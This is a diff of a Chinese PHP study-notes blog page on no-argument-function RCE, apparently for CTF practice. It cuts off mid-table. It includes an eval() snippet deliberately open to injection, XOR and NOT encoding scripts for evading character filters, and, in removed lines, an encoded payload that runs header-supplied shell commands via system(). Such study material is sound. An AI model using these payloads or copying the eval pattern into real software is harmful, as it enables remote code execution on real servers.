@@ -64,33 +64,370 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-学习笔记10" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-学习笔记11" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/12/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/" class="article-date">
-  <time datetime="2020-12-15T05:53:38.473Z" itemprop="datePublished">2020-12-15</time>
+    <a href="/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/" class="article-date">
+  <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
 </a>
     
   </div>
   <div class="article-inner">
     
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/">PHP小知识</a>
+    </h1>
+  
+
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <hr>
-<hr>
-<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215135456955.png" alt="image-20201215135456955"></p>
-<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215143317291.png" alt="image-20201215143317291"></p>
-<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215145933621.png" alt="image-20201215145933621"></p>
-<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215150021504.png" alt="image-20201215150021504"></p>
-<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215150046880.png" alt="image-20201215150046880"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())));</span><br></pre></td></tr></table></figure>
+        <h3 id="无参函数RCE"><a href="#无参函数RCE" class="headerlink" title="无参函数RCE"></a>无参函数RCE</h3><p>*只使用函数，且函数不能带有参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\ggken\AppData\Roaming\Typora\typora-user-images\image-20201215151550554.png" alt="image-20201215151550554"></p>
+<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit] )</span><br></pre></td></tr></table></figure>
+
+<p><code>pattern</code>：要搜索的模式，可以是字符串或一个字符串数组</p>
+<p><code>replacement</code>：用于替换的字符串或字符串数组</p>
+<p><code>subject</code>：要搜索替换的目标字符串或字符串数组</p>
+<p><code>limit</code>：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）</p>
+<p><code>count</code>：可选，为替换执行的次数</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(pattern, replacement, subject)</span><br></pre></td></tr></table></figure>
+
+<p>即：将<code>subject</code>中符合<code>pattern</code>的替换为<code>replacement</code></p>
+<p>对于<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])</code></p>
+<p>意思是，对传进来的code进行正则匹配，符合正则表达式的部分替换为空，然后返回一个新的字符串</p>
+<h3 id="preg-match-匹配未被过滤脚本"><a href="#preg-match-匹配未被过滤脚本" class="headerlink" title="preg_match()匹配未被过滤脚本"></a>preg_match()匹配未被过滤脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($a&#x3D; 0; $a&lt; 256; $a++) &#123;</span><br><span class="line">    if (!preg_match(&quot;&#x2F;[\w$&#x3D;()&lt;&gt;&#39;\&quot;]&#x2F;&quot;, chr($a))) &#123;</span><br><span class="line">        echo (chr($a));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>*异或的符号是<code>^</code>,是一种运算符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 &#x3D; 0</span><br><span class="line">1 ^ 0 &#x3D; 1</span><br><span class="line">0 ^ 1 &#x3D; 1</span><br><span class="line">0 ^ 0 &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="异或脚本"><a href="#异或脚本" class="headerlink" title="异或脚本"></a>异或脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i&#x3D;128;$i&lt;255;$i++)&#123;</span><br><span class="line">    echo sprintf(&quot;%s^%s&quot;,urlencode(chr($i)),urlencode(chr(255))).&quot;&#x3D;&gt;&quot;. (chr($i)^chr(255)).&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">%80^%FF&#x3D;&gt;</span><br><span class="line">%81^%FF&#x3D;&gt;~</span><br><span class="line">%82^%FF&#x3D;&gt;&#125;</span><br><span class="line">%83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;</span><br><span class="line">%85^%FF&#x3D;&gt;z</span><br><span class="line">%86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x</span><br><span class="line">%88^%FF&#x3D;&gt;w</span><br><span class="line">%89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u</span><br><span class="line">%8B^%FF&#x3D;&gt;t</span><br><span class="line">%8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r</span><br><span class="line">%8E^%FF&#x3D;&gt;q</span><br><span class="line">%8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o</span><br><span class="line">%91^%FF&#x3D;&gt;n</span><br><span class="line">%92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l</span><br><span class="line">%94^%FF&#x3D;&gt;k</span><br><span class="line">%95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i</span><br><span class="line">%97^%FF&#x3D;&gt;h</span><br><span class="line">%98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f</span><br><span class="line">%9A^%FF&#x3D;&gt;e</span><br><span class="line">%9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c</span><br><span class="line">%9D^%FF&#x3D;&gt;b</span><br><span class="line">%9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;</span><br><span class="line">%A0^%FF&#x3D;&gt;_</span><br><span class="line">%A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]</span><br><span class="line">%A3^%FF&#x3D;&gt;\</span><br><span class="line">%A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z</span><br><span class="line">%A6^%FF&#x3D;&gt;Y</span><br><span class="line">%A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W</span><br><span class="line">%A9^%FF&#x3D;&gt;V</span><br><span class="line">%AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T</span><br><span class="line">%AC^%FF&#x3D;&gt;S</span><br><span class="line">%AD^%FF&#x3D;&gt;R</span><br><span class="line">%AE^%FF&#x3D;&gt;Q</span><br><span class="line">%AF^%FF&#x3D;&gt;P</span><br><span class="line">%B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N</span><br><span class="line">%B2^%FF&#x3D;&gt;M</span><br><span class="line">%B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K</span><br><span class="line">%B5^%FF&#x3D;&gt;J</span><br><span class="line">%B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H</span><br><span class="line">%B8^%FF&#x3D;&gt;G</span><br><span class="line">%B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E</span><br><span class="line">%BB^%FF&#x3D;&gt;D</span><br><span class="line">%BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B</span><br><span class="line">%BE^%FF&#x3D;&gt;A</span><br><span class="line">%BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br><span class="line">%C1^%FF&#x3D;&gt;&gt;</span><br><span class="line">%C2^%FF&#x3D;&gt;&#x3D;</span><br><span class="line">%C3^%FF&#x3D;&gt;&lt;</span><br><span class="line">%C4^%FF&#x3D;&gt;;</span><br><span class="line">%C5^%FF&#x3D;&gt;:</span><br><span class="line">%C6^%FF&#x3D;&gt;9</span><br><span class="line">%C7^%FF&#x3D;&gt;8</span><br><span class="line">%C8^%FF&#x3D;&gt;7</span><br><span class="line">%C9^%FF&#x3D;&gt;6</span><br><span class="line">%CA^%FF&#x3D;&gt;5</span><br><span class="line">%CB^%FF&#x3D;&gt;4</span><br><span class="line">%CC^%FF&#x3D;&gt;3</span><br><span class="line">%CD^%FF&#x3D;&gt;2</span><br><span class="line">%CE^%FF&#x3D;&gt;1</span><br><span class="line">%CF^%FF&#x3D;&gt;0</span><br><span class="line">%D0^%FF&#x3D;&gt;&#x2F;</span><br><span class="line">%D1^%FF&#x3D;&gt;.</span><br><span class="line">%D2^%FF&#x3D;&gt;-</span><br><span class="line">%D3^%FF&#x3D;&gt;,</span><br><span class="line">%D4^%FF&#x3D;&gt;+</span><br><span class="line">%D5^%FF&#x3D;&gt;*</span><br><span class="line">%D6^%FF&#x3D;&gt;)</span><br><span class="line">%D7^%FF&#x3D;&gt;(</span><br><span class="line">%D8^%FF&#x3D;&gt;&#39;</span><br><span class="line">%D9^%FF&#x3D;&gt;&amp;</span><br><span class="line">%DA^%FF&#x3D;&gt;%</span><br><span class="line">%DB^%FF&#x3D;&gt;$</span><br><span class="line">%DC^%FF&#x3D;&gt;#</span><br><span class="line">%DD^%FF&#x3D;&gt;&quot;</span><br><span class="line">%DE^%FF&#x3D;&gt;!</span><br><span class="line">%DF^%FF&#x3D;&gt; </span><br><span class="line">%E0^%FF&#x3D;&gt;</span><br><span class="line">%E1^%FF&#x3D;&gt;</span><br><span class="line">%E2^%FF&#x3D;&gt;</span><br><span class="line">%E3^%FF&#x3D;&gt;</span><br><span class="line">%E4^%FF&#x3D;&gt;</span><br><span class="line">%E5^%FF&#x3D;&gt;</span><br><span class="line">%E6^%FF&#x3D;&gt;</span><br><span class="line">%E7^%FF&#x3D;&gt;</span><br><span class="line">%E8^%FF&#x3D;&gt;</span><br><span class="line">%E9^%FF&#x3D;&gt;</span><br><span class="line">%EA^%FF&#x3D;&gt;</span><br><span class="line">%EB^%FF&#x3D;&gt;</span><br><span class="line">%EC^%FF&#x3D;&gt;</span><br><span class="line">%ED^%FF&#x3D;&gt;</span><br><span class="line">%EE^%FF&#x3D;&gt;</span><br><span class="line">%EF^%FF&#x3D;&gt;</span><br><span class="line">%F0^%FF&#x3D;&gt;</span><br><span class="line">%F1^%FF&#x3D;&gt;</span><br><span class="line">%F2^%FF&#x3D;&gt;</span><br><span class="line">%F3^%FF&#x3D;&gt;</span><br><span class="line">%F4^%FF&#x3D;&gt;</span><br><span class="line">%F5^%FF&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">%F6^%FF&#x3D;&gt;	</span><br><span class="line">%F7^%FF&#x3D;&gt;</span><br><span class="line">%F8^%FF&#x3D;&gt;</span><br><span class="line">%F9^%FF&#x3D;&gt;</span><br><span class="line">%FA^%FF&#x3D;&gt;</span><br><span class="line">%FB^%FF&#x3D;&gt;</span><br><span class="line">%FC^%FF&#x3D;&gt;</span><br><span class="line">%FD^%FF&#x3D;&gt;</span><br><span class="line">%FE^%FF&#x3D;&gt;</span><br><span class="line">[Finished in 0.2s]</span><br></pre></td></tr></table></figure>
+
+<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>*取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0</p>
+<h4 id="取反脚本"><a href="#取反脚本" class="headerlink" title="取反脚本"></a>取反脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; urlencode(~&#39;phpinfo&#39;);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h3><h4 id="•show-source-—-highlight-file"><a href="#•show-source-—-highlight-file" class="headerlink" title="•show_source()—-highlight_file()"></a>•show_source()—-highlight_file()</h4><p>*函数对文件进行 PHP 语法高亮显示</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(filename,return)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>filename</em></td>
+<td>必需。规定要显示的文件。</td>
+</tr>
+<tr>
+<td><em>return</em></td>
+<td>可选。如果该参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。默认是 FALSE。</td>
+</tr>
+</tbody></table>
+<h4 id="•localeconv"><a href="#•localeconv" class="headerlink" title="•localeconv()"></a>•localeconv()</h4><ul>
+<li><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p>
+<p>localeconv() 函数返回以下数组元素：</p>
+<ul>
+<li>[decimal_point] - 小数点字符</li>
+<li>[thousands_sep] - 千位分隔符</li>
+<li>[int_curr_symbol] - 货币符号 （例如：USD）</li>
+<li>[currency_symbol] - 货币符号 （例如：$）</li>
+<li>[mon_decimal_point] - 货币小数点字符</li>
+<li>[mon_thousands_sep] - 货币千位分隔符</li>
+<li>[positive_sign] - 正值字符</li>
+<li>[negative_sign] - 负值字符</li>
+<li>[int_frac_digits] - 国际通用小数位</li>
+<li>[frac_digits] - 本地通用小数位</li>
+<li>[p_cs_precedes] - 如果货币符号在一个正数值之前显示，则为 True（1），如果在正数值之后显示，则为 False（0）</li>
+<li>[p_sep_by_space] - 如果在货币符号和正数值之间包含空格，则为 True（1），否则为 False（0）</li>
+<li>[n_cs_precedes] - 如果货币符号在一个负数值之前显示，则为 True（1），如果在负数值之后显示，则为 False（0）</li>
+<li>[n_sep_by_space] - 如果在货币符号和负数值之间包含空格，则为 True（1），否则为 False（0）</li>
+<li>[p_sign_posn] - 格式化选项：<ul>
+<li>0 - 把数量和货币符号写在圆括号内</li>
+<li>1 - 在数量和货币符号之前加上 + 号</li>
+<li>2 - 在数量和货币符号之后加上 + 号</li>
+<li>3 - 直接在货币符号之前加上 + 号</li>
+<li>4 - 直接在货币符号之后加上 + 号</li>
+</ul>
+</li>
+<li>[n_sign_posn] - 格式化选项：<ul>
+<li>0 - 把数量和货币符号写在圆括号内</li>
+<li>1 - 在数量和货币符号之前加上 - 号</li>
+<li>2 - 在数量和货币符号之后加上 - 号</li>
+<li>3 - 直接在货币符号之前加上 - 号</li>
+<li>4 - 直接在货币符号之后加上 - 号</li>
+</ul>
+</li>
+<li>[grouping] - 显示数字组合形式的数组（例如：3 指示 1 000 000）</li>
+<li>[mon_grouping] - 显示货币数字组合形式的数组（例如：2 指示 1 00 00 00）</li>
+</ul>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201220234003433.png"></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">array(18) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_curr_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;currency_symbol&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_decimal_point&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;mon_thousands_sep&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;positive_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;negative_sign&quot;]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;int_frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;frac_digits&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_cs_precedes&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sep_by_space&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;p_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;n_sign_posn&quot;]&#x3D;&gt;</span><br><span class="line">  int(127)</span><br><span class="line">  [&quot;grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;mon_grouping&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="•pos-—•current"><a href="#•pos-—•current" class="headerlink" title="•pos()—•current()"></a>•pos()—•current()</h4><p>*输出数组中的当前元素的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo pos($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153746288.png"></p>
+<h4 id="•end"><a href="#•end" class="headerlink" title="•end()"></a>•end()</h4><p>*输出数组中的当前元素和最后一个元素的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo end($people); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153648776.png"></p>
+<h4 id="•next"><a href="#•next" class="headerlink" title="•next ()"></a>•next ()</h4><p>*输出数组中的当前元素和下一个元素的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo next($people);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153542284.png"></p>
+<h4 id="•prev"><a href="#•prev" class="headerlink" title="•prev()"></a>•prev()</h4><p>*输出数组中的当前元素、下一个元素和上一个元素的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo next($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo prev($people);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153432353.png"></p>
+<h4 id="•reset"><a href="#•reset" class="headerlink" title="•reset()"></a>•reset()</h4><p>*输出数组中的当前元素和下一个元素的值，然后重置数组的内部指针到数组中的第一个元素</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Peter&quot;, &quot;Joe&quot;, &quot;Glenn&quot;, &quot;Cleveland&quot;);</span><br><span class="line"></span><br><span class="line">echo current($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo next($people) . &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo reset($people);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201223153325869.png"></p>
+<h4 id="•each"><a href="#•each" class="headerlink" title="•each()"></a>•each()</h4><p>*函数生成一个由数组当前内部指针所指向的元素的键名和键值组成的数组，并把内部指针向前移动</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">each(array)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>array</td>
+<td>必需。规定要使用的数组。</td>
+</tr>
+</tbody></table>
+<h4 id="•scandir"><a href="#•scandir" class="headerlink" title="•scandir()"></a>•scandir()</h4><p>*函数返回指定目录中的文件和目录的数组</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir(directory, sorting_order, context);</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>directory</em></td>
+<td>必需。规定要扫描的目录。</td>
+</tr>
+<tr>
+<td><em>sorting_order</em></td>
+<td>可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td>
+</tr>
+<tr>
+<td><em>context</em></td>
+<td>可选。规定目录句柄的环境。context 是可修改目录流的行为的一套选项。</td>
+</tr>
+</tbody></table>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201222233153591.png"></p>
+<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201222233355025.png"></p>
+<h4 id="•chdir"><a href="#•chdir" class="headerlink" title="•chdir()"></a>•chdir()</h4><p>*函数改变当前的目录</p>
+<p>*语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(directory)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
